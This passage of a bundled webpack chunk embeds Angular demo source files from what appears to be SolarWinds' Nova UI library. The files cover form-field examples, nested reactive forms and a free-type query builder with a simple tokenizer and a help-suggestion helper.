"form-field-validation-triggering",\n        component: FormFieldValidationTriggeringxampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiFormFieldModule,\n        NuiValidationMessageModule,\n        NuiTextboxModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiSelectModule,\n        NuiRadioModule,\n        NuiIconModule,\n        NuiDatePickerModule,\n        NuiDocsModule,\n        NuiSwitchModule,\n        NuiDateTimePickerModule,\n        NuiTimePickerModule,\n        NuiCheckboxModule,\n        RouterModule.forChild(routes),\n        NuiSelectV2Module,\n    ],\n    declarations: [\n        FormFieldExampleComponent,\n        FormFieldBasicExampleComponent,\n        FormFieldBasicHintExampleComponent,\n        FormFieldBasicReactiveExampleComponent,\n        FormFieldBasicReactiveCustomValidationExampleComponent,\n        FormFieldComplexExampleComponent,\n        FormFieldDynamicDisablingExampleComponent,\n        FormFieldInFormExampleComponent,\n        FormFieldTestComponent,\n        FormFieldVisualTestComponent,\n        FormFieldWithHTMLExampleComponent,\n        NestedFormsAsComponentExampleComponent,\n        FirstCustomFormExampleComponent,\n        SecondCustomFormExampleComponent,\n        FormFieldValidationTriggeringxampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("form-field"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class FormFieldModule {}\n'},57210:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    caption="This caption is generic for all form fields"\n    i18n-caption\n    [infoTemplate]="template"\n    hint="Hint may be useful"\n    i18n-hint\n>\n    <nui-textbox></nui-textbox>\n</nui-form-field>\n<ng-template #template>\n    New custom info text.\n    <p>\n        My paragraph. Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n        Suspendisse mollis purus ut odio tempus, ut venenatis diam egestas.\n    </p>\n    <h1>My header</h1>\n    <a href="http://apollo-docs.swdev.local/" target="_blank">My link</a>\n    <br />\n    <i>Italic text</i>\n    <br />\n    <strong>Strong text</strong>\n</ng-template>\n'},63014:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-form-field-with-html-example",\n    templateUrl: "./html-as-info-in-form-field.example.component.html",\n})\nexport class FormFieldWithHTMLExampleComponent {}\n'},8758:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="fancyForm" class="nui-edge-definer">\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Textbox"\n        i18n-caption\n        hint="This is a configurable help hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'textbox\']"\n    >\n        <nui-textbox id="input-textbox" formControlName="textbox"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Textbox number"\n        i18n-caption\n        hint="This is a configurable help hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'textNumber\']"\n    >\n        <nui-textbox-number\n            id="input-textNumber"\n            formControlName="textNumber"\n        ></nui-textbox-number>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Checkbox"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'checkbox\']"\n    >\n        <nui-checkbox\n            id="input-checkbox"\n            formControlName="checkbox"\n            required\n        ></nui-checkbox>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Checkbox Group"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'checkboxGroup\']"\n    >\n        <nui-checkbox-group\n            id="input-checkboxGroup"\n            formControlName="checkboxGroup"\n            name="vegetable"\n        >\n            <nui-checkbox\n                *ngFor="let vegetable of vegetables"\n                [value]="vegetable"\n            >\n                {{ vegetable }}\n            </nui-checkbox>\n        </nui-checkbox-group>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Radio Group"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'radioGroup\']"\n    >\n        <nui-radio-group\n            id="input-radioGroup"\n            formControlName="radioGroup"\n            name="vegetable"\n            required\n        >\n            <nui-radio *ngFor="let vegetable of vegetables" [value]="vegetable">\n                {{ vegetable }}\n            </nui-radio>\n        </nui-radio-group>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Switch"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'switch\']"\n    >\n        <nui-switch id="input-switch" formControlName="switch"></nui-switch>\n        <nui-validation-message for="required">\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Select"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'select\']"\n    >\n        <nui-select\n            id="input-select"\n            formControlName="select"\n            [itemsSource]="vegetables"\n        ></nui-select>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Combobox"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'combobox\']"\n    >\n        <nui-combobox\n            id="input-combobox"\n            formControlName="combobox"\n            [itemsSource]="vegetables"\n        ></nui-combobox>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Date Picker"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'datePicker\']"\n    >\n        <nui-date-picker\n            id="input-datePicker"\n            formControlName="datePicker"\n        ></nui-date-picker>\n        <nui-validation-message for="invalidFormat" i18n>\n            The format is incorrect\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Time Picker"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'timePicker\']"\n    >\n        <nui-time-picker\n            id="input-timePicker"\n            formControlName="timePicker"\n        ></nui-time-picker>\n        <nui-validation-message for="required" i18n>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        caption="Date Time Picker"\n        hint="Some pretty long text with hint. Longer than previous even. This text should not ellipsify."\n        info="text"\n    >\n        <nui-date-time-picker\n            id="input-dateTimePicker"\n            formControlName="dateTimePicker"\n        >\n        </nui-date-time-picker>\n        <nui-validation-message>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},25058:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport moment from "moment/moment";\n\n@Component({\n    selector: "nui-form-field-in-form-example",\n    templateUrl: "./in-form-form-field.example.component.html",\n})\nexport class FormFieldInFormExampleComponent {\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public fancyForm;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private changeDetector: ChangeDetectorRef\n    ) {\n        this.fancyForm = this.formBuilder.group({\n            textbox: this.formBuilder.control("", [Validators.required]),\n            textNumber: this.formBuilder.control(0, [Validators.required]),\n            checkbox: this.formBuilder.control(true, [Validators.requiredTrue]),\n            checkboxGroup: this.formBuilder.control(\n                ["Cabbage", "Potato"],\n                [Validators.required]\n            ),\n            radioGroup: this.formBuilder.control(this.vegetables[1], [\n                Validators.required,\n            ]),\n            switch: this.formBuilder.control(false, [Validators.requiredTrue]),\n            select: this.formBuilder.control("", [Validators.required]),\n            combobox: this.formBuilder.control("", [Validators.required]),\n            datePicker: this.formBuilder.control(moment()),\n            timePicker: this.formBuilder.control("", [Validators.required]),\n            dateTimePicker: this.formBuilder.control(moment(), [\n                Validators.required,\n            ]),\n        });\n    }\n}\n'},23e3:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./form-field-docs/form-field-docs.example.component";\nexport * from "./basic/basic-form-field.example.component";\nexport * from "./basic-reactive/basic-reactive-form-field.example.component";\nexport * from "./in-form/in-form-form-field.example.component";\nexport * from "./complex/form-field-complex.example.component";\nexport * from "./nested-forms-as-component/nested-forms-as-component.example.component";\nexport * from "./form-field-visual-test/form-field-visual-test.component";\nexport * from "./dynamic-disabling/form-field-dynamic-disabling.example.component";\nexport * from "./form-field-test/form-field-test.component";\nexport * from "./html-as-info/html-as-info-in-form-field.example.component";\nexport * from "./form-field-validation-triggering/form-field-validation-triggering.example.component";\n'},57966:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form\n    [formGroup]="fancyForm"\n    (submit)="onSubmit(fancyForm)"\n    class="nui-edge-definer"\n>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Nickname"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'nickname\']"\n    >\n        <nui-textbox formControlName="nickname"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-first-custom-form-example\n        (formReady)="formInitialized(\'firstForm\', $event)"\n    ></nui-first-custom-form-example>\n    <nui-second-custom-form-example\n        (formReady)="formInitialized(\'secondForm\', $event)"\n    ></nui-second-custom-form-example>\n    <pre>fancyForm.valid = {{ fancyForm.valid }}</pre>\n</form>\n'},59658:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, EventEmitter, Inject, OnInit, Output } from "@angular/core";\nimport {\n    FormBuilder,\n    FormControl,\n    FormGroup,\n    Validators,\n} from "@angular/forms";\n\nimport { ToastService } from "@nova-ui/bits";\n\ntype NestedFormGroup = FormGroup<{\n    nickname: FormControl;\n    firstForm?: FirstFormGroup;\n    secondForm?: SecondFormGroup;\n}>;\n\ntype FirstFormGroup = FormGroup<{\n    firstName: FormControl;\n    lastName: FormControl;\n}>;\n\ntype SecondFormGroup = FormGroup<{\n    city: FormControl;\n    address: FormControl;\n}>;\n\n@Component({\n    selector: "nui-nested-forms-as-component-example",\n    templateUrl: "./nested-forms-as-component.example.component.html",\n})\nexport class NestedFormsAsComponentExampleComponent implements OnInit {\n    public fancyForm: NestedFormGroup;\n\n    constructor(\n        private fb: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public ngOnInit(): void {\n        this.fancyForm = this.fb.group({\n            nickname: this.fb.control("", [\n                Validators.required,\n                Validators.min(3),\n            ]),\n        });\n    }\n\n    public formInitialized(\n        name: "firstForm" | "secondForm",\n        form: FirstFormGroup | SecondFormGroup\n    ): void {\n        this.fancyForm.setControl(name, form);\n    }\n\n    public onSubmit(value: NestedFormGroup): void {\n        this.toastService.success({\n            message: `Form is valid: ${value.valid}`,\n            title: "Submit",\n        });\n    }\n}\n\n/**\n * Component representing form group for name and surname\n */\n@Component({\n    selector: "nui-first-custom-form-example",\n    template: ` <div [formGroup]="firstForm">\n        <nui-form-field\n            class="d-block mb-4"\n            caption="First Name"\n            i18n-caption\n            [control]="firstForm.controls[\'firstName\']"\n        >\n            <nui-textbox formControlName="firstName"></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n        <nui-form-field\n            class="d-block mb-4"\n            caption="Last Name"\n            i18n-caption\n            [control]="firstForm.controls[\'lastName\']"\n        >\n            <nui-textbox formControlName="lastName"></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n    </div>`,\n})\nexport class FirstCustomFormExampleComponent implements OnInit {\n    @Output() formReady = new EventEmitter<FirstFormGroup>();\n    public firstForm = this.fb.group({\n        firstName: this.fb.control("", Validators.required),\n        lastName: this.fb.control("", Validators.required),\n    });\n\n    constructor(private fb: FormBuilder) {}\n\n    public ngOnInit(): void {\n        this.formReady.emit(this.firstForm);\n    }\n}\n\n/**\n * Component representing address form group\n */\n@Component({\n    selector: "nui-second-custom-form-example",\n    template: ` <div [formGroup]="secondForm">\n        <nui-form-field\n            class="d-block mb-4"\n            caption="City"\n            i18n-caption\n            [control]="secondForm.controls[\'city\']"\n        >\n            <nui-textbox formControlName="city"></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n        <nui-form-field\n            class="d-block mb-4"\n            caption="Address"\n            i18n-caption\n            [control]="secondForm.controls[\'address\']"\n        >\n            <nui-textbox formControlName="address"></nui-textbox>\n            <nui-validation-message for="required" i18n>\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n    </div>`,\n})\nexport class SecondCustomFormExampleComponent implements OnInit {\n    @Output() formReady = new EventEmitter<SecondFormGroup>();\n    public secondForm = this.fb.group({\n        city: null,\n        address: null,\n    });\n\n    constructor(private fb: FormBuilder) {}\n\n    public ngOnInit(): void {\n        this.formReady.emit(this.secondForm);\n    }\n}\n'},74187:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { HelpEntry } from "@nova-ui/bits";\n\nimport { ExampleAppToken, ExampleAppTokenType } from "./models";\n\n/**\n * This is example of how can be help updated based on selected token also shows how notifications can be shown.\n *\n * This is NOT required approach.\n *\n * FreeTypeQueryBuilder does not enforce specific approach.\n *\n * This specific example is updating help based on focused token type.\n */\nexport class ExampleHelp {\n    getCurrentHelp(idx: number, tokens: ExampleAppToken[]): HelpEntry[] {\n        const currentHelp: HelpEntry[] = [];\n        if (tokens[idx]?.issue) {\n            currentHelp.push({\n                items: [\n                    {\n                        message: {\n                            displayValue: tokens[idx].issueMessage,\n                        },\n                        severity: tokens[idx].issue,\n                    },\n                ],\n                notice: true,\n            });\n        }\n        if (\n            tokens.length === 0 ||\n            tokens[idx]?.type === ExampleAppTokenType.SELECT_KEYWORD\n        ) {\n            currentHelp.push({ displayValue: "SELECT", value: "SELECT" });\n            return currentHelp;\n        }\n        if (this.containsSelectToken(tokens) || idx === 1) {\n            currentHelp.push(\n                { displayValue: "*", value: "*" },\n                { displayValue: "name", value: "name" },\n                { displayValue: "age", value: "age" },\n                { displayValue: "address", value: "address" }\n            );\n            return currentHelp;\n        }\n\n        if (\n            this.containsSelectionValue(tokens) ||\n            tokens[idx]?.type === ExampleAppTokenType.FROM_KEYWORD\n        ) {\n            currentHelp.push({ displayValue: "FROM", value: "FROM" });\n            return currentHelp;\n        }\n\n        if (this.containsFromToken(tokens) || idx === 3) {\n            currentHelp.push(\n                { displayValue: "Table1", value: "Table1" },\n                { displayValue: "Table2", value: "Table2" },\n                { displayValue: "Table3", value: "Table3" }\n            );\n            return currentHelp;\n        }\n\n        if (this.containsFromValue(tokens)) {\n            return currentHelp;\n        }\n        return currentHelp;\n    }\n\n    containsSelectToken(tokens: ExampleAppToken[]): boolean {\n        const tokenTypes = tokens.map((token: ExampleAppToken) => token.type);\n\n        return (\n            tokenTypes.toString() ===\n            [ExampleAppTokenType.SELECT_KEYWORD].toString()\n        );\n    }\n\n    containsSelectionValue(tokens: ExampleAppToken[]): boolean {\n        const tokenTypes = tokens.map((token: ExampleAppToken) => token.type);\n\n        return (\n            tokenTypes.toString() ===\n            [\n                ExampleAppTokenType.SELECT_KEYWORD,\n                ExampleAppTokenType.STRING,\n            ].toString()\n        );\n    }\n\n    containsFromToken(tokens: ExampleAppToken[]): boolean {\n        const tokenTypes = tokens.map((token: ExampleAppToken) => token.type);\n\n        return (\n            tokenTypes.toString() ===\n            [\n                ExampleAppTokenType.SELECT_KEYWORD,\n                ExampleAppTokenType.STRING,\n                ExampleAppTokenType.FROM_KEYWORD,\n            ].toString()\n        );\n    }\n\n    containsFromValue(tokens: ExampleAppToken[]): boolean {\n        const tokenTypes = tokens.map((token: ExampleAppToken) => token.type);\n\n        return (\n            tokenTypes.toString() ===\n            [\n                ExampleAppTokenType.SELECT_KEYWORD,\n                ExampleAppTokenType.STRING,\n                ExampleAppTokenType.FROM_KEYWORD,\n                ExampleAppTokenType.STRING,\n            ].toString()\n        );\n    }\n}\n'},60555:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Tokenizer } from "@nova-ui/bits";\n\nimport { ExampleAppToken, ExampleAppTokenType } from "./models";\n\nexport class ExampleTokenizer implements Tokenizer<ExampleAppToken> {\n    tokenizeText(text: string): ExampleAppToken[] {\n        if (!text) {\n            return [];\n        }\n        const trimmedText = text.trim();\n        const SEPARATOR = " ";\n        const tokens: ExampleAppToken[] = [];\n        const splits = trimmedText.split(SEPARATOR);\n        let index = 0;\n        for (let i = 0; i < splits.length; i++) {\n            tokens.push({\n                value: splits[i],\n                type: this.getTokenType(splits[i]),\n                start: index,\n                end: index + splits[i].length - 1,\n            });\n            index += splits[i].length + SEPARATOR.length;\n        }\n        return tokens;\n    }\n\n    private getTokenType(tokenValue: string): ExampleAppTokenType {\n        if (/SELECT/.test(tokenValue)) {\n            return ExampleAppTokenType.SELECT_KEYWORD;\n        } else if (/FROM/.test(tokenValue)) {\n            return ExampleAppTokenType.FROM_KEYWORD;\n        } else if (/\\w+|\\*/.test(tokenValue)) {\n            return ExampleAppTokenType.STRING;\n        }\n        return ExampleAppTokenType.UNDEFINED;\n    }\n}\n'},71138:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-freetype-query-builder\n    [value]="value"\n    [currentHelp]="currentHelp"\n    [tokenizer]="tokenizer"\n    [renderer]="renderer"\n    [placeholder]="placeholder"\n    [cursorSetter$]="cursorSetter$$"\n    [readonly]="readonly"\n    (currentValue)="onValueChange($event)"\n    (cursorPos)="onCursorPosChange($event)"\n    (submitQuery)="onSubmit()"\n    (helpItemSelected)="updateTextAfterHelpSelection($event)"\n>\n</nui-freetype-query-builder>\n'},9470:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component, EventEmitter } from "@angular/core";\nimport { BehaviorSubject } from "rxjs";\n\nimport { HelpEntry, ToastService, Tokenizer } from "@nova-ui/bits";\n\nimport { ExampleHelp } from "./example-help";\nimport { ExampleTokenizer } from "./example-tokenizer";\nimport { ExampleAppToken, ExampleAppTokenType } from "./models";\nimport { ExampleAppRenderer } from "./renderer";\n\n@Component({\n    selector: "nui-freetype-query-builder-basic-example",\n    templateUrl: "freetype-query-builder-basic.example.component.html",\n})\nexport class FreetypeQueryBuilderBasicExampleComponent {\n    readonly: boolean = false;\n    readonly SEPARATOR = " ";\n    placeholder: string = "Click to start building query";\n    value: string = "";\n    valueChange = new EventEmitter<string>();\n    tokens: ExampleAppToken[] = [];\n    cursorSetter$$ = new BehaviorSubject<number>(-1);\n    currentCursorPos = this.cursorSetter$$.value;\n\n    renderer = new ExampleAppRenderer();\n    currentHelp: HelpEntry[] = [];\n    tokenizer: Tokenizer<ExampleAppToken> = new ExampleTokenizer();\n    helpUpdater: ExampleHelp = new ExampleHelp();\n\n    constructor(\n        private cd: ChangeDetectorRef,\n        private toastService: ToastService\n    ) {}\n\n    onValueChange($event: { value: string; tokens: ExampleAppToken[] }): void {\n        this.tokens = $event.tokens;\n        if (this.value !== $event.value) {\n            this.value = $event.value;\n        }\n        this.updateHelp();\n    }\n\n    onCursorPosChange($event: number): void {\n        if (this.currentCursorPos !== $event) {\n            this.currentCursorPos = $event;\n            this.updateHelp();\n            this.cd.detectChanges();\n        }\n    }\n\n    onSubmit(): void {\n        this.toastService.success({\n            message: "Query was successfully submitted.",\n        });\n    }\n\n    /**\n     * This is example of how can be handled selection value in help. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce replacing any value\n     * in the input. It offers full flexibility on consumer side to decide what action is going to happen when option is chosen.\n     *\n     * This specific example will replace value of current token with value from option selected.\n     * @param $event\n     */\n    updateTextAfterHelpSelection($event: { value: string }): void {\n        const idx = this.getFocusedTokenIndex();\n        if (idx === -1) {\n            this.value = this.value + $event.value + this.SEPARATOR;\n            this.cursorSetter$$.next(this.value.length);\n        } else {\n            const nextCurPos = this.tokens[idx].start + $event.value.length;\n            this.value =\n                this.value.substring(0, this.tokens[idx].start) +\n                $event.value +\n                this.value.substring(this.tokens[idx].end + 1);\n            this.cursorSetter$$.next(nextCurPos);\n        }\n        this.onCursorPosChange(this.value.length + 1);\n\n        this.checkValidity();\n    }\n\n    /**\n     * This is example of how can be help updated based on selected token. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce specific approach.\n     *\n     * This specific example is updating help based on focused token type.\n     */\n    updateHelp(): void {\n        const idx = this.getFocusedTokenIndex();\n        this.currentHelp = this.helpUpdater.getCurrentHelp(idx, this.tokens);\n    }\n\n    getFocusedTokenIndex(): number {\n        for (let i = 0; i < this.tokens.length; i++) {\n            if (\n                this.tokens[i].start <= this.currentCursorPos &&\n                this.tokens[i].end >= this.currentCursorPos\n            ) {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    checkValidity(): void {\n        const tokenTypes = this.tokens.map((token) => token.type);\n\n        switch (tokenTypes.toString()) {\n            case 